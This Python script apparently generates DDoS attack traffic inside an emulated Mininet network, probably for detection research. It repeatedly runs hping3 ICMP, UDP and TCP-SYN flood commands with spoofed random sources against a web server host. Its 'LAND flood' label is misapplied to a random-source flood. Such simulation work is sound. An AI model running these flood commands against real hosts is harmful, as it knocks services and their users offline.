from datetime import datetime
from time import sleep
from random import choice, randint

from mininet.net import Mininet
from mininet.node import RemoteController
from mininet.node import Controller
from mininet.link import TCLink
from mininet.log import setLogLevel

from lib.Topology import ApplicationTopology
from lib.application_parameters import controller as controller_params, switches as switches_params, hosts as hosts_params, config as config_params, delay
from lib.helpers import draw_horizontal_line, retrieve_ip_address_from_cidr_ip, retrieve_host_number_from_cidr_ip


def run_ddos_attack_traffic():
    hosts = list()
    app_topology = ApplicationTopology(controller_params, switches_params, hosts_params, config_params)
    controller = RemoteController("C0", ip="127.0.0.1")
    net = Mininet(topo=app_topology, controller=controller, link=TCLink)
    # net = Mininet(app_topology, controller=Controller)

    net.start()

    # print(dir(app_topology))

    for host_name in app_topology.params["hosts"]["names"]:
        hosts.append(net.get(host_name))

    base_host_index = 0

    host_1 = host_1 = net.get("H1")
    host_1_ip = retrieve_ip_address_from_cidr_ip(host_1.params["ip"])
    host_1_mac = host_1.params["mac"]
    host_1_name = host_1.name

    host_1.cmd("cd /home/mininet/webserver")
    host_1.cmd("python -m SimpleHTTPServer 80 &")



    for i in range(1000):
        print("\n")
        print(draw_horizontal_line())
        print("# of Iteration {} ...".format((i+1)))
        print(draw_horizontal_line())

        # d = randint(120, 256)
        # c = randint(32, 128)

        command_idx = randint(0, 4)
        if command_idx == 1:
            source_host = choice(hosts)
            cmd = "timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(host_1_ip)
            print("\n")
            print(draw_horizontal_line())
            print("PERFORMING ICMP FLOOD DDOS ATTACKS")
            print(draw_horizontal_line())
            print("\n")
            print('Executing "{}"\n'.format(cmd))
            source_host.cmd(cmd)
            sleep(delay)

        elif command_idx == 2:
            source_host = choice(hosts)
            cmd = "timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood {}".format(host_1_ip)
            print("\n")
            print(draw_horizontal_line())
            print("PERFORMING UDP FLOOD DDOS ATTACKS")
            print(draw_horizontal_line())
            print("\n")
            print('Executing "{}"\n'.format(cmd))
            source_host.cmd(cmd)
            sleep(delay)

        elif command_idx == 3:
            source_host = choice(hosts)
            cmd = "timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(host_1_ip)
            print("\n")
            print(draw_horizontal_line())
            print("PERFORMING TCP-SYN FLOOD DDOS ATTACKS")
            print(draw_horizontal_line())
            print("\n")
            print('Executing "{}"\n'.format(cmd))
            source_host.cmd(cmd)
            sleep(delay)

        else:
            source_host = choice(hosts)
            random_ip = '.'.join(['%s'%randint(0, 200),'.'.join('%s'%randint(0, 255) for i in range(3))])
            cmd = "timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a {} {}".format(random_ip, host_1_ip)
            print("\n")
            print(draw_horizontal_line())
            print("PERFORMING LAND FLOOD DDOS ATTACKS")
            print(draw_horizontal_line())
            print("\n")
            print('Executing "{}"\n'.format(cmd))
            source_host.cmd(cmd)
            sleep(delay)

    net.stop()

if __name__ == '__main__':
    start_time = datetime.now()
    setLogLevel("info")
    run_ddos_attack_traffic()
    stop_time = datetime.now()

    print("\n\n")
    print("Time taken to generate DDoS Attack Traffic generation is {}".format(stop_time - start_time))
    print("\n\n")